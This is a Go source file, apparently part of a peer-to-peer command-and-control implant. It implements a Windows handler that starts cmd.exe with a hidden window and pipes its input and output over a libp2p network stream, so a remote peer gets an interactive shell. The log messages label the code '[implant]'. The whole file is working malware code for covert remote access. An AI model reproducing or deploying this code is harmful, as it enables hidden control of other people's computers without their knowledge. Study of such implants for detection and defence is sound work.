//go:build windows

package core

import (
	"bytes"
	"encoding/binary"
	"io"
	"log"
	"os/exec"
	"syscall"

	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var rows, cols uint16
	if err := binary.Read(s, binary.LittleEndian, &rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}
	if rows < 10 || cols < 10 {
		rows = 30
		cols = 120
	}

	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Printf("[implant] stdin pipe: %v", err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[implant] stdout pipe: %v", err)
		return
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		log.Printf("[implant] start cmd: %v", err)
		return
	}

	log.Printf("[implant] shell started for %s", remotePeer.String())

	go func() {
		io.Copy(&crlfWriter{w: stdin}, s)
		stdin.Close()
		cmd.Process.Kill()
	}()

	io.Copy(s, stdout)
	cmd.Wait()

	log.Printf("[implant] shell ended for %s", remotePeer.String())
}

type crlfWriter struct {
	w io.WriteCloser
}

func (c *crlfWriter) Write(p []byte) (int, error) {
	expanded := bytes.ReplaceAll(p, []byte{'\n'}, []byte{'\r', '\n'})
	if _, err := c.w.Write(expanded); err != nil {
		return 0, err
	}
	return len(p), nil
}
